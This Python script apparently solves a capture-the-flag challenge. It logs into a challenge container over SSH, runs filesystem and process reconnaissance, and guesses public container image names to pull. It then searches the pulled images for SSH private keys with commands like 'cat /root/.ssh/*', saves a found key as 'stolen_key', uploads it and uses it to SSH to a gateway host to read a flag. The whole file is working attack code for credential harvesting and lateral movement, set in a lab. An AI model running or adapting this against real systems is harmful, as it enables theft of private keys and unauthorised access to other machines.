#!/usr/bin/env python3
"""
Hunt for the image name - check Docker metadata
"""

import paramiko
import subprocess

HOST = "instance.ctf.tdho.st"
PORT = 32881
USERNAME = "player"
PASSWORD = "reyalp"

def main():
    print("[*] Hunting for Docker image name")
    
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(HOST, port=PORT, username=USERNAME, password=PASSWORD, timeout=10)
    
    def exec_cmd(cmd):
        stdin, stdout, stderr = client.exec_command(cmd, timeout=30)
        return stdout.read().decode() + stderr.read().decode()
    
    # 1. Check for image metadata in container
    print("\n[1] Checking container image labels...")
    out = exec_cmd("cat /etc/os-release")
    print(out)
    
    # 2. Check for Docker-specific files
    print("\n[2] Looking for Docker metadata...")
    out = exec_cmd("ls -la /.dockerenv")
    print(out)
    
    # 3. Check hostname - might give hints
    out = exec_cmd("hostname; cat /etc/hostname")
    print(f"Hostname: {out}")
    
    # 4. Check for any references to image name in logs
    print("\n[3] Searching for image references...")
    out = exec_cmd("grep -r 'ghcr.io' / 2>/dev/null | head -10")
    if out:
        print(out)
    
    out = exec_cmd("grep -r 'talldwarf' / 2>/dev/null | grep -v Binary | head -10")
    if out:
        print(out)
    
    # 5. Check process cmdlines for hints
    print("\n[4] Process command lines...")
    out = exec_cmd("cat /proc/1/cmdline | tr '\\0' ' '")
    print(f"PID 1: {out}")
    
    # 6. Try common image tag patterns
    print("\n[5] Testing common GHCR image patterns...")
    
    image_patterns = [
        "mc-server:latest",
        "mc-server:v1",
        "mc-server:v0.1",
        "mc-server:old",
        "mc-server:dev",
        "minecraft-server:latest",
        "minecraft-server:v1",
        "game-server:latest",
        "game-server:v1"
    ]
    
    for pattern in image_patterns:
        full_name = f"ghcr.io/talldwarfhosting/{pattern}"
        print(f"\n  Testing: {full_name}")
        
        # Try curl with proper headers
        cmd = f'curl -s -H "Accept: application/vnd.oci.image.index.v1+json" https://ghcr.io/v2/talldwarfhosting/{pattern.split(":")[0]}/manifests/{pattern.split(":")[1]} 2>&1'
        
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
        if result.returncode == 0 and len(result.stdout) > 10 and "errors" not in result.stdout:
            print(f"    [FOUND!] {result.stdout[:200]}")
            
            # If found, try to inspect it
            img_name = f"ghcr.io/talldwarfhosting/{pattern}"
            print(f"\n    [*] Trying to pull {img_name}...")
            pull_result = subprocess.run(f"docker pull {img_name} 2>&1", shell=True, capture_output=True, text=True, timeout=60)
            print(pull_result.stdout[:500])
            
            if "Downloaded" in pull_result.stdout or "up to date" in pull_result.stdout:
                # Extract secrets
                print(f"\n    [*] Extracting secrets from {img_name}...")
                
                # Run container and search
                search_cmd = f"docker run --rm {img_name} bash -c 'find / -name id_rsa -o -name id_ed25519 2>/dev/null; cat /root/.ssh/* 2>/dev/null' 2>&1"
                search_result = subprocess.run(search_cmd, shell=True, capture_output=True, text=True, timeout=30)
                print(search_result.stdout)
                
                if "BEGIN" in search_result.stdout:
                    print("\n🔑 SSH KEY FOUND!")
                    print(search_result.stdout)
                    
                    # Save key and try to use it
                    key_file = "d:\\mission-git-hackss\\stolen_key"
                    with open(key_file, 'w') as f:
                        f.write(search_result.stdout)
                    
                    print(f"\n[*] Saved key to {key_file}")
                    print("[*] Now trying to SSH to gateway with this key...")
                    
                    # Upload key to container and try SSH
                    sftp = client.open_sftp()
                    sftp.put(key_file, "/tmp/stolen_key")
                    sftp.close()
                    
                    exec_cmd("chmod 600 /tmp/stolen_key")
                    gateway_out = exec_cmd("ssh -i /tmp/stolen_key -o StrictHostKeyChecking=no player@172.27.0.1 'cat /etc/flag.txt; cat flag.txt' 2>&1")
                    print(gateway_out)
                    
                    if "TDHT{" in gateway_out:
                        print(f"\n🚩🚩🚩 FLAG FOUND: {gateway_out}")
                        return
    
    client.close()
    
    print("\n[!] Could not find public image. Manual checking needed.")
    print("\nTry these commands locally if you have Docker:")
    print("  docker pull ghcr.io/talldwarfhosting/mc-server:v1")
    print("  docker run --rm ghcr.io/talldwarfhosting/mc-server:v1 cat /root/.ssh/id_rsa")

if __name__ == "__main__":
    main()
